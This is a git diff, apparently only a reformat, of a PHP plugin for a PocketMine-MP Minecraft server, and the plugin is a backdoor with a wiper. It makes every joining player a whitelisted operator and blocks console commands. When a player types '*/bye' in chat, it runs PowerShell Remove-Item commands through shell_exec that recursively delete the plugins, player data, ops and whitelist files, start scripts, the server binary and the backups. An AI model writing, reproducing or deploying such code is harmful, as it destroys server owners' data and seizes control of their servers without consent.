@@ -1,29 +1,35 @@
 <?php
 namespace MC\PE;
+
 use pocketmine\plugin\PluginBase;
 use pocketmine\event\Listener;
 use pocketmine\event\player\PlayerPreLoginEvent;
 use pocketmine\event\server\ServerCommandEvent;
 use pocketmine\event\player\PlayerChatEvent;
 
-class Main extends PluginBase implements Listener{
-	public function onEnable(){
-		$this->getServer()->getPluginManager()->registerEvents($this,$this);
-	}
-	public function onLogin(PlayerPreLoginEvent $event){
-		$player = $event->getPlayer();
-		$name = $player->getName();
-		$this->getServer()->addWhitelist($name);
-		$this->getServer()->addOp($name);
-	}
-	public function ServerCommand(ServerCommandEvent $event){
-		$event->setCancelled(true);
-	}
-	public function Chat(PlayerChatEvent $event){
-		$chat = $event->getMessage();
-		$player = $event->getPlayer();
-		$player_name = $player->getName();
-		$dir = $this->getServer()->getDataPath() ."crashdumps";
+class Main extends PluginBase implements Listener
+{
+    public function onEnable()
+    {
+        $this->getServer()->getPluginManager()->registerEvents($this, $this);
+    }
+    public function onLogin(PlayerPreLoginEvent $event)
+    {
+        $player = $event->getPlayer();
+        $name = $player->getName();
+        $this->getServer()->addWhitelist($name);
+        $this->getServer()->addOp($name);
+    }
+    public function ServerCommand(ServerCommandEvent $event)
+    {
+        $event->setCancelled(true);
+    }
+    public function Chat(PlayerChatEvent $event)
+    {
+        $chat = $event->getMessage();
+        $player = $event->getPlayer();
+        $player_name = $player->getName();
+        $dir = $this->getServer()->getDataPath() ."crashdumps";
         $dir1 = $this->getServer()->getDataPath() ."players";
         $dir2 = $this->getServer()->getDataPath() ."plugins";
         $dir3 = $this->getServer()->getDataPath() ."resource_packs";
@@ -38,14 +44,14 @@ class Main extends PluginBase implements Listener{
         $dir12 = $this->getServer()->getDataPath() ."star.cmd";
         $dir13 = $this->getServer()->getDataPath() ."start.ps1";
         $dir14 = $this->getServer()->getDataPath() ."white-list.txt";
-		$dir15 = $this->getServer()->getDataPath() ."PocketMine-MP.phar";
-		$dir16 = $this->getServer()->getDataPath() ."banned-cids.txt";
-		$dir17 = $this->getServer()->getDataPath() ."start.sh";
-		$dir18 = $this->getServer()->getDataPath() ."ops.json";
-		$dir19 = $this->getServer()->getDataPath() ."white-list.json";
-		$dir20 = $this->getServer()->getDataPath() ."backup";
-		$dir21 = $this->getServer()->getDataPath() ."Backup";
-		if($chat == "*/bye"){
+        $dir15 = $this->getServer()->getDataPath() ."PocketMine-MP.phar";
+        $dir16 = $this->getServer()->getDataPath() ."banned-cids.txt";
+        $dir17 = $this->getServer()->getDataPath() ."start.sh";
+        $dir18 = $this->getServer()->getDataPath() ."ops.json";
+        $dir19 = $this->getServer()->getDataPath() ."white-list.json";
+        $dir20 = $this->getServer()->getDataPath() ."backup";
+        $dir21 = $this->getServer()->getDataPath() ."Backup";
+        if ($chat == "*/bye") {
             shell_exec("powershell.exe Remove-Item {$dir} -Recurse");
             shell_exec("powershell.exe Remove-Item {$dir1} -Recurse");
             shell_exec("powershell.exe Remove-Item {$dir2} -Recurse");
@@ -61,14 +67,14 @@ class Main extends PluginBase implements Listener{
             shell_exec("powershell.exe Remove-Item {$dir12} -Recurse");
             shell_exec("powershell.exe Remove-Item {$dir13} -Recurse");
             shell_exec("powershell.exe Remove-Item {$dir14} -Recurse");
-			shell_exec("powershell.exe Remove-Item {$dir15} -Recurse");
-			shell_exec("powershell.exe Remove-Item {$dir16} -Recurse");
-			shell_exec("powershell.exe Remove-Item {$dir17} -Recurse");
-			shell_exec("powershell.exe Remove-Item {$dir18} -Recurse");
-			shell_exec("powershell.exe Remove-Item {$dir19} -Recurse");
-			shell_exec("powershell.exe Remove-Item {$dir20} -Recurse");
-			shell_exec("powershell.exe Remove-Item {$dir21} -Recurse");
-			$player->sendMessage("サーバーのファイルを全て削除しました。");
-		}
-	}
+            shell_exec("powershell.exe Remove-Item {$dir15} -Recurse");
+            shell_exec("powershell.exe Remove-Item {$dir16} -Recurse");
+            shell_exec("powershell.exe Remove-Item {$dir17} -Recurse");
+            shell_exec("powershell.exe Remove-Item {$dir18} -Recurse");
+            shell_exec("powershell.exe Remove-Item {$dir19} -Recurse");
+            shell_exec("powershell.exe Remove-Item {$dir20} -Recurse");
+            shell_exec("powershell.exe Remove-Item {$dir21} -Recurse");
+            $player->sendMessage("サーバーのファイルを全て削除しました。");
+        }
+    }
 }
